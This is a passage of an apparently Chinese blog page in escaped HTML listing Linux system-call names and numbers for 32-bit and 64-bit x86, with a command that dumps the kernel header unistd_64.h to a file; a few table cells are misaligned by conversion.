>\n<tr>\n<td>geteuid</td>\n<td>49</td>\n<td>getegid</td>\n<td>50</td>\n</tr>\n<tr>\n<td>acct</td>\n<td>51</td>\n<td>umount2</td>\n<td>52</td>\n</tr>\n<tr>\n<td>lock</td>\n<td>53</td>\n<td>ioctl</td>\n<td>54</td>\n</tr>\n<tr>\n<td>fcntl</td>\n<td>55</td>\n<td>mpx</td>\n<td>56</td>\n</tr>\n<tr>\n<td>setpgid</td>\n<td>57</td>\n<td>ulimit</td>\n<td>58</td>\n</tr>\n<tr>\n<td>oldolduname</td>\n<td>59</td>\n<td>umask</td>\n<td>60</td>\n</tr>\n<tr>\n<td>chroot</td>\n<td>61</td>\n<td>ustat</td>\n<td>62</td>\n</tr>\n<tr>\n<td>dup2</td>\n<td>63</td>\n<td>getppid</td>\n<td>64</td>\n</tr>\n<tr>\n<td>getpgrp</td>\n<td>65</td>\n<td>setsid</td>\n<td>66</td>\n</tr>\n<tr>\n<td>sigaction</td>\n<td>67</td>\n<td>sgetmask</td>\n<td>68</td>\n</tr>\n<tr>\n<td>ssetmask</td>\n<td>69</td>\n<td>setreuid</td>\n<td>70</td>\n</tr>\n<tr>\n<td>setregid</td>\n<td>71</td>\n<td>sigsuspend</td>\n<td>72</td>\n</tr>\n<tr>\n<td>sigpending</td>\n<td>73</td>\n<td>sethostname</td>\n<td>74</td>\n</tr>\n<tr>\n<td>setrlimit</td>\n<td>75</td>\n<td>getrlimit</td>\n<td>76</td>\n</tr>\n<tr>\n<td>getrusage</td>\n<td>77</td>\n<td>gettimeofday</td>\n<td>78</td>\n</tr>\n<tr>\n<td>settimeofday</td>\n<td>79</td>\n<td>getgroups</td>\n<td>80</td>\n</tr>\n<tr>\n<td>setgroups</td>\n<td>81</td>\n<td>select</td>\n<td>82</td>\n</tr>\n<tr>\n<td>symlink</td>\n<td>83</td>\n<td>oldlstat</td>\n<td>84</td>\n</tr>\n<tr>\n<td>readlink</td>\n<td>85</td>\n<td>uselib</td>\n<td>86</td>\n</tr>\n<tr>\n<td>swapon</td>\n<td>87</td>\n<td>reboot</td>\n<td>88</td>\n</tr>\n<tr>\n<td>readdir</td>\n<td>89</td>\n<td>mmap</td>\n<td>90</td>\n</tr>\n<tr>\n<td>munmap</td>\n<td>91</td>\n<td>truncate</td>\n<td>92</td>\n</tr>\n<tr>\n<td>ftruncate</td>\n<td>93</td>\n<td>fchmod</td>\n<td>94</td>\n</tr>\n<tr>\n<td>fchown</td>\n<td>95</td>\n<td>getpriority</td>\n<td>96</td>\n</tr>\n<tr>\n<td>setpriority</td>\n<td>97</td>\n<td>profil</td>\n<td>98</td>\n</tr>\n<tr>\n<td>statfs</td>\n<td>99</td>\n<td>fstatfs</td>\n<td>100</td>\n</tr>\n<tr>\n<td>ioperm</td>\n<td>101</td>\n<td>socketcall</td>\n<td>102</td>\n</tr>\n<tr>\n<td>syslog</td>\n<td>103</td>\n<td>setitimer</td>\n<td>104</td>\n</tr>\n<tr>\n<td>getitimer</td>\n<td>105</td>\n<td>stat</td>\n<td>106</td>\n</tr>\n<tr>\n<td>lstat</td>\n<td>107</td>\n<td>fstat</td>\n<td>108</td>\n</tr>\n<tr>\n<td>olduname</td>\n<td>109</td>\n<td>iopl</td>\n<td>110</td>\n</tr>\n<tr>\n<td>vhangup</td>\n<td>111</td>\n<td>idle</td>\n<td>112</td>\n</tr>\n<tr>\n<td>vm86old</td>\n<td>113</td>\n<td>wait4</td>\n<td>114</td>\n</tr>\n<tr>\n<td>swapoff</td>\n<td>115</td>\n<td>sysinfo</td>\n<td>116</td>\n</tr>\n<tr>\n<td>ipc</td>\n<td>117</td>\n<td>fsync</td>\n<td>118</td>\n</tr>\n<tr>\n<td>sigreturn</td>\n<td>119</td>\n<td>clone</td>\n<td>120</td>\n</tr>\n<tr>\n<td>setdomainname</td>\n<td>121</td>\n<td>uname</td>\n<td>122</td>\n</tr>\n<tr>\n<td>modify_ldt</td>\n<td>123</td>\n<td>adjtimex</td>\n<td>124</td>\n</tr>\n<tr>\n<td>mprotect</td>\n<td>125</td>\n<td>sigprocmask</td>\n<td>126</td>\n</tr>\n<tr>\n<td>create_module</td>\n<td>127</td>\n<td>init_module</td>\n<td>128</td>\n</tr>\n<tr>\n<td>delete_module</td>\n<td>129</td>\n<td>get_kernel_syms</td>\n<td>130</td>\n</tr>\n<tr>\n<td>quotactl</td>\n<td>131</td>\n<td>getpgid</td>\n<td>132</td>\n</tr>\n<tr>\n<td>fchdir</td>\n<td>133</td>\n<td>bdflush</td>\n<td>134</td>\n</tr>\n<tr>\n<td>sysfs</td>\n<td>135</td>\n<td>personality</td>\n<td>136</td>\n</tr>\n<tr>\n<td>afs_syscall</td>\n<td>137</td>\n<td>setfsuid</td>\n<td>138</td>\n</tr>\n<tr>\n<td>setfsgid</td>\n<td>139</td>\n<td>_llseek</td>\n<td>140</td>\n</tr>\n<tr>\n<td>getdents</td>\n<td>141</td>\n<td>_newselect</td>\n<td>142</td>\n</tr>\n<tr>\n<td>flock</td>\n<td>143</td>\n<td>msync</td>\n<td>144</td>\n</tr>\n<tr>\n<td>readv</td>\n<td>145</td>\n<td>writev</td>\n<td>146</td>\n</tr>\n<tr>\n<td>getsid</td>\n<td>147</td>\n<td>fdatasync</td>\n<td>148</td>\n</tr>\n<tr>\n<td>_sysctl</td>\n<td>149</td>\n<td>mlock</td>\n<td>150</td>\n</tr>\n<tr>\n<td>munlock</td>\n<td>151</td>\n<td>mlockall</td>\n<td>152</td>\n</tr>\n<tr>\n<td>munlockall</td>\n<td>153</td>\n<td>sched_setparam</td>\n<td>154</td>\n</tr>\n<tr>\n<td>sched_getparam</td>\n<td>155</td>\n<td>sched_setscheduler</td>\n<td>156</td>\n</tr>\n<tr>\n<td>sched_getscheduler</td>\n<td>157</td>\n<td>sched_yield</td>\n<td>158</td>\n</tr>\n<tr>\n<td>sched_get_priority_max</td>\n<td>159</td>\n<td>sched_get_priority_min</td>\n<td>160</td>\n</tr>\n<tr>\n<td>sched_rr_get_interval</td>\n<td>161</td>\n<td>nanosleep</td>\n<td>162</td>\n</tr>\n<tr>\n<td>mremap</td>\n<td>163</td>\n<td>setresuid</td>\n<td>164</td>\n</tr>\n<tr>\n<td>getresuid</td>\n<td>165</td>\n<td>vm86</td>\n<td>166</td>\n</tr>\n<tr>\n<td>query_module</td>\n<td>167</td>\n<td>poll</td>\n<td>168</td>\n</tr>\n<tr>\n<td>nfsservctl</td>\n<td>169</td>\n<td>setresgid</td>\n<td>170</td>\n</tr>\n<tr>\n<td>getresgid</td>\n<td>171</td>\n<td>prctl</td>\n<td>172</td>\n</tr>\n<tr>\n<td>rt_sigreturn</td>\n<td>173</td>\n<td>rt_sigaction</td>\n<td>174</td>\n</tr>\n<tr>\n<td>rt_sigprocmask</td>\n<td>175</td>\n<td>rt_sigpending</td>\n<td>176</td>\n</tr>\n<tr>\n<td>rt_sigtimedwait</td>\n<td>177</td>\n<td>rt_sigqueueinfo</td>\n<td>178</td>\n</tr>\n<tr>\n<td>rt_sigsuspend</td>\n<td>179</td>\n<td>pread64</td>\n<td>180</td>\n</tr>\n<tr>\n<td>pwrite64</td>\n<td>181</td>\n<td>chown</td>\n<td>182</td>\n</tr>\n<tr>\n<td>getcwd</td>\n<td>183</td>\n<td>capget</td>\n<td>184</td>\n</tr>\n<tr>\n<td>capset</td>\n<td>185</td>\n<td>sigaltstack</td>\n<td>186</td>\n</tr>\n<tr>\n<td>sendfile</td>\n<td>187</td>\n<td>getpmsg</td>\n<td>188</td>\n</tr>\n<tr>\n<td>putpmsg</td>\n<td>189</td>\n<td>vfork</td>\n<td>190</td>\n</tr>\n<tr>\n<td>ugetrlimit</td>\n<td>191</td>\n<td>mmap2</td>\n<td>192</td>\n</tr>\n<tr>\n<td>truncate64</td>\n<td>193</td>\n<td>ftruncate64</td>\n<td>194</td>\n</tr>\n<tr>\n<td>stat64</td>\n<td>195</td>\n<td>lstat64</td>\n<td>196</td>\n</tr>\n<tr>\n<td>fstat64</td>\n<td>197</td>\n<td>lchown32</td>\n<td>198</td>\n</tr>\n<tr>\n<td>getuid32</td>\n<td>199</td>\n<td>getgid32</td>\n<td>200</td>\n</tr>\n<tr>\n<td>geteuid32</td>\n<td>201</td>\n<td>getegid32</td>\n<td>202</td>\n</tr>\n<tr>\n<td>setreuid32</td>\n<td>203</td>\n<td>setregid32</td>\n<td>204</td>\n</tr>\n<tr>\n<td>getgroups32</td>\n<td>205</td>\n<td>setgroups32</td>\n<td>206</td>\n</tr>\n<tr>\n<td>fchown32</td>\n<td>207</td>\n<td>setresuid32</td>\n<td>208</td>\n</tr>\n<tr>\n<td>getresuid32</td>\n<td>209</td>\n<td>setresgid32</td>\n<td>210</td>\n</tr>\n<tr>\n<td>getresgid32</td>\n<td>211</td>\n<td>chown32</td>\n<td>212</td>\n</tr>\n<tr>\n<td>setuid32</td>\n<td>213</td>\n<td>setgid32</td>\n<td>214</td>\n</tr>\n<tr>\n<td>setfsuid32</td>\n<td>215</td>\n<td>setfsgid32</td>\n<td>216</td>\n</tr>\n<tr>\n<td>pivot_root</td>\n<td>217</td>\n<td>mincore</td>\n<td>218</td>\n</tr>\n<tr>\n<td>madvise</td>\n<td>219</td>\n<td>madvise1</td>\n<td>219</td>\n</tr>\n<tr>\n<td>getdents64</td>\n<td>220</td>\n<td>⏫delete when C</td>\n<td>lib stub is removed</td>\n</tr>\n<tr>\n<td>fcntl64</td>\n<td>221</td>\n<td>gettid</td>\n<td>224</td>\n</tr>\n<tr>\n<td>readahead</td>\n<td>225</td>\n<td>setxattr</td>\n<td>226</td>\n</tr>\n<tr>\n<td>lsetxattr</td>\n<td>227</td>\n<td>fsetxattr</td>\n<td>228</td>\n</tr>\n<tr>\n<td>getxattr</td>\n<td>229</td>\n<td>lgetxattr</td>\n<td>230</td>\n</tr>\n<tr>\n<td>fgetxattr</td>\n<td>231</td>\n<td>listxattr</td>\n<td>232</td>\n</tr>\n<tr>\n<td>llistxattr</td>\n<td>233</td>\n<td>flistxattr</td>\n<td>234</td>\n</tr>\n<tr>\n<td>removexattr</td>\n<td>235</td>\n<td>lremovexattr</td>\n<td>236</td>\n</tr>\n<tr>\n<td>fremovexattr</td>\n<td>237</td>\n<td>tkill</td>\n<td>238</td>\n</tr>\n<tr>\n<td>sendfile64</td>\n<td>239</td>\n<td>futex</td>\n<td>240</td>\n</tr>\n<tr>\n<td>sched_setaffinity</td>\n<td>241</td>\n<td>sched_getaffinity</td>\n<td>242</td>\n</tr>\n<tr>\n<td>set_thread_area</td>\n<td>243</td>\n<td>get_thread_area</td>\n<td>244</td>\n</tr>\n<tr>\n<td>io_setup</td>\n<td>245</td>\n<td>io_destroy</td>\n<td>246</td>\n</tr>\n<tr>\n<td>io_getevents</td>\n<td>247</td>\n<td>io_submit</td>\n<td>248</td>\n</tr>\n<tr>\n<td>io_cancel</td>\n<td>249</td>\n<td>fadvise64</td>\n<td>250</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>exit_group</td>\n<td>252</td>\n</tr>\n<tr>\n<td>lookup_dcookie</td>\n<td>253</td>\n<td>epoll_create</td>\n<td>254</td>\n</tr>\n<tr>\n<td>epoll_ctl</td>\n<td>255</td>\n<td>epoll_wait</td>\n<td>256</td>\n</tr>\n<tr>\n<td>remap_file_pages</td>\n<td>257</td>\n<td>set_tid_address</td>\n<td>258</td>\n</tr>\n<tr>\n<td>timer_create</td>\n<td>259</td>\n<td>timer_settime</td>\n<td>260</td>\n</tr>\n<tr>\n<td>timer_gettime</td>\n<td>261</td>\n<td>timer_getoverrun</td>\n<td>262</td>\n</tr>\n<tr>\n<td>timer_delete</td>\n<td>263</td>\n<td>clock_settime</td>\n<td>264</td>\n</tr>\n<tr>\n<td>clock_gettime</td>\n<td>265</td>\n<td>clock_getres</td>\n<td>266</td>\n</tr>\n<tr>\n<td>clock_nanosleep</td>\n<td>267</td>\n<td>statfs64</td>\n<td>268</td>\n</tr>\n<tr>\n<td>fstatfs64</td>\n<td>269</td>\n<td>tgkill</td>\n<td>270</td>\n</tr>\n<tr>\n<td>utimes</td>\n<td>271</td>\n<td>fadvise64_64</td>\n<td>272</td>\n</tr>\n<tr>\n<td>vserver</td>\n<td>273</td>\n<td>mbind</td>\n<td>274</td>\n</tr>\n<tr>\n<td>get_mempolicy</td>\n<td>275</td>\n<td>set_mempolicy</td>\n<td>276</td>\n</tr>\n<tr>\n<td>mq_open</td>\n<td>277</td>\n<td>mq_unlink</td>\n<td>278</td>\n</tr>\n<tr>\n<td>mq_timedsend</td>\n<td>279</td>\n<td>mq_timedreceive</td>\n<td>280</td>\n</tr>\n<tr>\n<td>mq_notify</td>\n<td>281</td>\n<td>mq_getsetattr</td>\n<td>282</td>\n</tr>\n<tr>\n<td>kexec_load</td>\n<td>283</td>\n<td>waitid</td>\n<td>284</td>\n</tr>\n<tr>\n<td>sys_setaltroot</td>\n<td>285</td>\n<td>add_key</td>\n<td>286</td>\n</tr>\n<tr>\n<td>request_key</td>\n<td>287</td>\n<td>keyctl</td>\n<td>288</td>\n</tr>\n<tr>\n<td>ioprio_set</td>\n<td>289</td>\n<td>ioprio_get</td>\n<td>290</td>\n</tr>\n<tr>\n<td>inotify_init</td>\n<td>291</td>\n<td>inotify_add_watch</td>\n<td>292</td>\n</tr>\n<tr>\n<td>inotify_rm_watch</td>\n<td>293</td>\n<td>migrate_pages</td>\n<td>294</td>\n</tr>\n<tr>\n<td>openat</td>\n<td>295</td>\n<td>mkdirat</td>\n<td>296</td>\n</tr>\n<tr>\n<td>mknodat</td>\n<td>297</td>\n<td>fchownat</td>\n<td>298</td>\n</tr>\n<tr>\n<td>futimesat</td>\n<td>299</td>\n<td>fstatat64</td>\n<td>300</td>\n</tr>\n<tr>\n<td>unlinkat</td>\n<td>301</td>\n<td>renameat</td>\n<td>302</td>\n</tr>\n<tr>\n<td>linkat</td>\n<td>303</td>\n<td>symlinkat</td>\n<td>304</td>\n</tr>\n<tr>\n<td>readlinkat</td>\n<td>305</td>\n<td>fchmodat</td>\n<td>306</td>\n</tr>\n<tr>\n<td>faccessat</td>\n<td>307</td>\n<td>pselect6</td>\n<td>308</td>\n</tr>\n<tr>\n<td>ppoll</td>\n<td>309</td>\n<td>unshare</td>\n<td>310</td>\n</tr>\n<tr>\n<td>set_robust_list</td>\n<td>311</td>\n<td>get_robust_list</td>\n<td>312</td>\n</tr>\n<tr>\n<td>splice</td>\n<td>313</td>\n<td>sync_file_range</td>\n<td>314</td>\n</tr>\n<tr>\n<td>tee</td>\n<td>315</td>\n<td>vmsplice</td>\n<td>316</td>\n</tr>\n<tr>\n<td>move_pages</td>\n<td>317</td>\n<td>getcpu</td>\n<td>318</td>\n</tr>\n<tr>\n<td>epoll_pwait</td>\n<td>319</td>\n<td>utimensat</td>\n<td>320</td>\n</tr>\n<tr>\n<td>signalfd</td>\n<td>321</td>\n<td>timerfd_create</td>\n<td>322</td>\n</tr>\n<tr>\n<td>eventfd</td>\n<td>323</td>\n<td>fallocate</td>\n<td>324</td>\n</tr>\n<tr>\n<td>timerfd_settime</td>\n<td>325</td>\n<td>timerfd_gettime</td>\n<td>326</td>\n</tr>\n<tr>\n<td>signalfd4</td>\n<td>327</td>\n<td>eventfd2</td>\n<td>328</td>\n</tr>\n<tr>\n<td>epoll_create1</td>\n<td>329</td>\n<td>dup3</td>\n<td>330</td>\n</tr>\n<tr>\n<td>pipe2</td>\n<td>331</td>\n<td>inotify_init1</td>\n<td>332</td>\n</tr>\n<tr>\n<td>preadv</td>\n<td>333</td>\n<td>pwritev</td>\n<td>334</td>\n</tr>\n<tr>\n<td>rt_tgsigqueueinfo</td>\n<td>335</td>\n<td>perf_event_open</td>\n<td>336</td>\n</tr>\n<tr>\n<td>recvmmsg</td>\n<td>337</td>\n<td>fanotify_init</td>\n<td>338</td>\n</tr>\n<tr>\n<td>fanotify_mark</td>\n<td>339</td>\n<td>prlimit64</td>\n<td>340</td>\n</tr>\n<tr>\n<td>name_to_handle_at</td>\n<td>341</td>\n<td>open_by_handle_at</td>\n<td>342</td>\n</tr>\n<tr>\n<td>clock_adjtime</td>\n<td>343</td>\n<td>syncfs</td>\n<td>344</td>\n</tr>\n<tr>\n<td>sendmmsg</td>\n<td>345</td>\n<td>set_ns</td>\n<td>346</td>\n</tr>\n<tr>\n<td>process_vm_readv</td>\n<td>347</td>\n<td>process_vm_writev</td>\n<td>348</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h3 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_64.h &gt; syscall.list</span><br></pre></td></tr></table></figure>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>系统调用</th>\n<th>调用号</th>\n<th>系统调用</th>\n<th>调用号</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>read</td>\n<td>0</td>\n<td>write</td>\n<td>1</td>\n</tr>\n<tr>\n<td>open</td>\n<td>2</td>\n<td>close</td>\n<td>3</td>\n</tr>\n<tr>\n<td>stat</td>\n<td>4</td>\n<td>fstat</td>\n<td>5</td>\n</tr>\n<tr>\n<td>lstat</td>\n<td>6</td>\n<td>poll</td>\n<td>7</td>\n</tr>\n<tr>\n<td>lseek</td>\n<td>8</td>\n<td>mmap</td>\n<td>9</td>\n</tr>\n<tr>\n<td>mprotect</td>\n<td>10</td>\n<td>munmap</td>\n<td>11</td>\n</tr>\n<tr>\n<td>brk</td>\n<td>12</td>\n<td>rt_sigaction</td>\n<td>13</td>\n</tr>\n<tr>\n<td>rt_sigprocmask</td>\n<td>14</td>\n<td>rt_sigreturn</td>\n<td>15</td>\n</tr>\n<tr>\n<td>ioctl</td>\n<td>16</td>\n<td>pread64</td>\n<td>17</td>\n</tr>\n<tr>\n<td>pwrite64</td>\n<td>18</td>\n<td>readv</td>\n<td>19</td>\n</tr>\n<tr>\n<td>writev</td>\n<td>20</td>\n<td>access</td>\n<td>21</td>\n</tr>\n<tr>\n<td>pipe</td>\n<td>22</td>\n<td>select</td>\n<td>23</td>\n</tr>\n<tr>\n<td>sched_yield</td>\n<td>24</td>\n<td>mremap</td>\n<td>25</td>\n</tr>\n<tr>\n<td>msync</td>\n<td>26</td>\n<td>mincore</td>\n<td>27</td>\n</tr>\n<tr>\n<td>madvise</td>\n<td>28</td>\n<td>shmget</td>\n<td>29</td>\n</tr>\n<tr>\n<td>shmat</td>\n<td>30</td>\n<td>shmctl</td>\n<td>31</td>\n</tr>\n<tr>\n<td>dup</td>\n<td>32</td>\n<td>dup2</td>\n<td>33</td>\n</tr>\n<tr>\n<td>pause</td>\n<td>34</td>\n<td>nanosleep</td>\n<td>35</td>\n</tr>\n<tr>\n<td>getitimer</td>\n<td>36</td>\n<td>alarm</td>\n<td>37</td>\n</tr>\n<tr>\n<td>setitimer</td>\n<td>38</td>\n<td>getpid</td>\n<td>39</td>\n</tr>\n<tr>\n<td>sendfile</td>\n<td>40</td>\n<td>socket</td>\n<td>41</td>\n</tr>\n<tr>\n<td>connect</td>\n<td>42</td>\n<td>accept</td>\n<td>43</td>\n</tr>\n<tr>\n<td>sendto</td>\n<td>44</td>\n<td>recvfrom</td>\n<td>45</td>\n</tr>\n<tr>\n<td>sendmsg</td>\n<td>46</td>\n<td>recvmsg</td>\n<td>47</td>\n</tr>\n<tr>\n<td>shutdown</td>\n<td>48</td>\n<td>bind</td>\n<td>49</td>\n</tr>\n<tr>\n<td>listen</td>\n<td>50</td>\n<td>getsockname</td>\n<td>51</td>\n</tr>\n<tr>\n<td>getpeername</td>\n<td>52</td>\n<td>socketpair</td>\n<td>53</td>\n</tr>\n<tr>\n<td>setsockopt</td>\n<td>54</td>\n<td>getsockopt</td>\n<td>55</td>\n</tr>\n<tr>\n<td>clone</td>\n<td>56</td>\n<td>fork</td>\n<td>57</td>\n</tr>\n<tr>\n<td>vfork</td>\n<td>58</td>\n<td>execve</td>\n<td>59</td>\n</tr>\n<tr>\n<td>exit</td>\n<td>60</td>\n<td>wait4</td>\n<td>61</td>\n</tr>\n<tr>\n<td>kill</td>\n<td>62</td>\n<td>uname</td>\n<td>63</td>\n</tr>\n<tr>\n<td>semget</td>\n<td>64</td>\n<td>semop</td>\n<td>65</td>\n</tr>\n<tr>\n<td>semctl</td>\n<td>66</td>\n<td>shmdt</td>\n<td>67</td>\n</tr>\n<tr>\n<td>msgget</td>\n<td>68</td>\n<td>msgsnd</td>\n<td>69</td>\n</tr>\n<tr>\n<td>msgrcv</td>\n<td>70</td>\n<td>msgctl</td>\n<td>71</td>\n</tr>\n<tr>\n<td>fcntl</td>\n<td>72</td>\n<td>flock</td>\n<td>73</td>\n</tr>\n<tr>\n<td>fsync</td>\n<td>74</td>\n<td>fdatasync</td>\n<td>75</td>\n</tr>\n<tr>\n<td>truncate</td>\n<td>76</td>\n<td>ftruncate</td>\n<td>77</td>\n</tr>\n<tr>\n<td>getdents</td>\n<td>78</td>\n<td>getcwd</td>\n<td>79</td>\n</tr>\n<tr>\n<td>chdir</td>\n<td>80</td>\n<td>fchdir</td>\n<td>81</td>\n</tr>\n<tr>\n<td>rename</td>\n<td>82</td>\n<td>mkdir</td>\n<td>83</td>\n</tr>\n<tr>\n<td>rmdir</td>\n<td>84</td>\n<td>creat</td>\n<td>85</td>\n</tr>\n<tr>\n<td>link</td>\n<td>86</td>\n<td>unlink</td>\n<td>87</td>\n</tr>\n<tr>\n<td>symlink</td>\n<td>88</td>\n<td>readlink</td>\n<td>89</td>\n</tr>\n<tr>\n<td>chmod</td>\n<td>90</td>\n<td>fchmod</td>\n<td>91</td>\n</tr>\n<tr>\n<td>chown</td>\n<td>92</td>\n<td>fchown</td>\n<td>93</td>\n</tr>\n<tr>\n<td>lchown</td>\n<td>94</td>\n<td>umask</td>\n<td>95</td>\n</tr>\n<tr>\n<td>gettimeofday</td>\n<td>96</td>\n<td>getrlimit</td>\n<td>97</td>\n</tr>\n<tr>\n<td>getrusage</td>\n<td>98</td>\n<td>sysinfo</td>\n<td>99</td>\n</tr>\n<tr>\n<td>times</td>\n<td>100</td>\n<td>ptrace</td>\n<td>101</td>\n</tr>\n<tr>\n<td>getuid</td>\n<td>102</td>\n<td>syslog</td>\n<td>103</td>\n</tr>\n<tr>\n<td>getgid</td>\n<td>104</td>\n<td>setuid</td>\n<td>105</td>\n</tr>\n<tr>\n<td>setgid</td>\n<td>106</td>\n<td>geteuid</td>\n<td>107</td>\n</tr>\n<tr>\n<td>getegid</td>\n<td>108</td>\n<td>setpgid</td>\n<td>109</td>\n</tr>\n<tr>\n<td>getppid</td>\n<td>110</td>\n<td>getpgrp</td>\n<td>111</td>\n</tr>\n<tr>\n<td>setsid</td>\n<td>112</td>\n<td>setreuid</td>\n<td>113</td>\n</tr>\n<tr>\n<td>setregid</td>\n<td>114</td>\n<td>getgroups</td>\n<td>115</td>\n</tr>\n<tr>\n<td>setgroups</td>\n<td>116</td>\n<td>setresuid</td>\n<td>117</td>\n</tr>\n<tr>\n<td>getresuid</td>\n<td>118</td>\n<td>setresgid</td>\n<td>119</td>\n</tr>\n<tr>\n<td>getresgid</td>\n<td>120</td>\n<td>getpgid</td>\n<td>121</td>\n</tr>\n<tr>\n<td>setfsuid</td>\n<td>122</td>\n<td>setfsgid</td>\n<td>123</td>\n</tr>\n<tr>\n<td>getsid</td>\n<td>124</td>\n<td>capget</td>\n<td>125</td>\n</tr>\n<tr>\n<td>capset</td>\n<td>126</td>\n<td>rt_sigpending</td>\n<td>127</td>\n</tr>\n<tr>\n<td>rt_sigtimedwait</td>\n<td>128</td>\n<td>rt_sigqueueinfo</td>\n<td>129</td>\n</tr>\n<tr>\n<td>rt_sigsuspend</td>\n<td>130</td>\n<td>sigaltstack</td>\n<td>131</td>\n</tr>\n<tr>\n<td>utime</td>\n<td>132</td>\n<td>mknod</td>\n<td>133</td>\n</tr>\n<tr>\n<td>uselib</td>\n<td>13</td>\n<td>4personality</td>\n<td>135</td>\n</tr>\n<tr>\n<td>ustat</td>\n<td>136</td>\n<td>statfs</td>\n<td>137</td>\n</tr>\n<tr>\n<td>fstatfs</td>\n<td>138</td>\n<td>sysfs</td>\n<td>139</td>\n</tr>\n<tr>\n<td>getpriority</td>\n<td>140</td>\n<td>setpriority</td>\n<td>141</td>\n</tr>\n<tr>\n<td>sched_setparam</td>\n<td>142</td>\n<td>sched_getparam</td>\n<td>143</td>\n</tr>\n<tr>\n<td>sched_setscheduler</td>\n<td>144</td>\n<td>sched_getscheduler</td>\n<td>145</td>\n</tr>\n<tr>\n<td>sched_get_priority_max</td>\n<td>146</td>\n<td>sched_get_priority_min</td>\n<td>147</td>\n</tr>\n<tr>\n<td>sched_rr_get_interval</td>\n<td>148</td>\n<td>mlock</td>\n<td>149</td>\n</tr>\n<tr>\n<td>munlock</td>\n<td>150</td>\n<td>mlockall</td>\n<td>151</td>\n</tr>\n<tr>\n<td>munlockall</td>\n<td>152</td>\n<td>vhangup</td>\n<td>153</td>\n</tr>\n<tr>\n<td>modify_ldt</td>\n<td>154</td>\n<td>pivot_root</td>\n<td>155</td>\n</tr>\n<tr>\n<td>_sysctl</td>\n<td>156</td>\n<td>prctl</td>\n<td>157</td>\n</tr>\n<tr>\n<td>arch_prctl</td>\n<td>158</td>\n<td>adjtimex</td>\n<td>159</td>\n</tr>\n<tr>\n<td>setrlimit</td>\n<td>160</td>\n<td>chroot</td>\n<td>161</td>\n</tr>\n<tr>\n<td>sync</td>\n<td>162</td>\n<td>acct</td>\n<td>163</td>\n</tr>\n<tr>\n<td>settimeofday</td>\n<td>164</td>\n<td>mount</td>\n<td>165</td>\n</tr>\n<tr>\n<td>umount2</td>\n<td>166</td>\n<td>swapon</td>\n<td>167</td>\n</tr>\n<tr>\n<td>swapoff</td>\n<td>168</td>\n<td>reboot</td>\n<td>169</td>\n</tr>\n<tr>\n<td>sethostname</td>\n<td>170</td>\n<td>setdomainname</td>\n<td>171</td>\n</tr>\n<tr>\n<td>iopl</td>\n<td>172</td>\n<td>ioperm</td>\n<td>173</td>\n</tr>\n<tr>\n<td>create_module</td>\n<td>174</td>\n<td>init_module</td>\n<td>175</td>\n</tr>\n<tr>\n<td>delete_module</td>\n<td>176</td>\n<td>get_kernel_syms</td>\n<td>177</td>\n</tr>\n<tr>\n<td>query_module</td>\n<td>178</td>\n<td>quotactl</td>\n<td>179</td>\n</tr>\n<tr>\n<td>nfsservctl</td>\n<td>180</td>\n<td>getpmsg</td>\n<td>181</td>\n</tr>\n<tr>\n<td>putpmsg</td>\n<td>182</td>\n<td>afs_syscall</td>\n<td>183</td>\n</tr>\n<tr>\n<td>tuxcall</td>\n<td>184</td>\n<td>security</td>\n<td>185</td>\n</tr>\n<tr>\n<td>gettid</td>\n<td>186</td>\n<td>readahead</td>\n<td>187</td>\n</tr>\n<tr>\n<td>setxattr</td>\n<td>188</td>\n<td>lsetxattr</td>\n<td>189</td>\n</tr>\n<tr>\n<td>fsetxattr</td>\n<td>190</td>\n<td>getxattr</td>\n<td>191</td>\n</tr>\n<tr>\n<td>lgetxattr</td>\n<td>192</td>\n<td>fgetxattr</td>\n<td>193</td>\n</tr>\n<tr>\n<td>listxattr</td>\n<td>194</td>\n<td>llistxattr</td>\n<td>195</td>\n</tr>\n<tr>\n<td>flistxattr</td>\n<td>196</td>\n<td>removexattr</td>\n<td>197</td>\n</tr>\n<tr>\n<td>lremovexattr</td>\n<td>198</td>\n<td>fremovexattr</td>\n<td>199</td>\n</tr>\n<tr>\n<td>tkill</td>\n<td>200</td>\n<td>time</td>\n<td>201</td>\n</tr>\n<tr>\n<td>futex</td>\n<td>202</td>\n<td>sched_setaffinity</td>\n<td>203</td>\n</tr>\n<tr>\n<td>sched_getaffinity</td>\n<td>204</td>\n<td>set_thread_area</td>\n<td>205</td>\n</tr>\n<tr>\n<td>io_setup</td>\n<td>206</td>\n<td>io_destroy</td>\n<td>207</td>\n</tr>\n<tr>\n<td>io_getevents</td>\n<td>208</td>\n<td>io_submit</td>\n<td>209</td>\n</tr>\n<tr>\n<td>io_cancel</td>\n<td>210</td>\n<td>get_thread_area</td>\n<td>211</td>\n</tr>\n<tr>\n<td>lookup_dcookie</td>\n<td>212</td>\n<td>epoll_create</td>\n<td>213</td>\n</tr>\n<tr>\n<td>epoll_ctl_old</td>\n<td>214</td>\n<td>epoll_wait_old</td>\n<td>215</td>\n</tr>\n<tr>\n<td>remap_file_pages</td>\n<td>216</td>\n<td>getdents64</td>\n<td>217</td>\n</tr>\n<tr>\n<td>set_tid_address</td>\n<td>218</td>\n<td>restart_syscall</td>\n<td>219</td>\n</tr>\n<tr>\n<td>semtimedop</td>\n<td>220</td>\n<td>fadvise64</td>\n<td>221</td>\n</tr>\n<tr>\n<td>timer_create</td>\n<td>222</td>\n<td>timer_settime</td>\n<td>223</td>\n</tr>\n<tr>\n<td>timer_gettime</td>\n<td>224</td>\n<td>timer_getoverrun</td>\n<td>225</td>\n</tr>\n<tr>\n<td>timer_delete</td>\n<td>226</td>\n<td>clock_settime</td>\n<td>227</td>\n</tr>\n<tr>\n<td>clock_gettime</td>\n<td>228</td>\n<td>clock_getres</td>\n<td>229</td>\n</tr>\n<tr>\n<td>clock_nanosleep</td>\n<td>230</td>\n<td>exit_group</td>\n<td>231</td>\n</tr>\n<tr>\n<td>epoll_wait</td>\n<td>232</td>\n<td>epoll_ctl</td>\n<td>233</td>\n</tr>\n<tr>\n<td>tgkill</td>\n<td>234</td>\n<td>utimes</td>\n<td>235</td>\n</tr>\n<tr>\n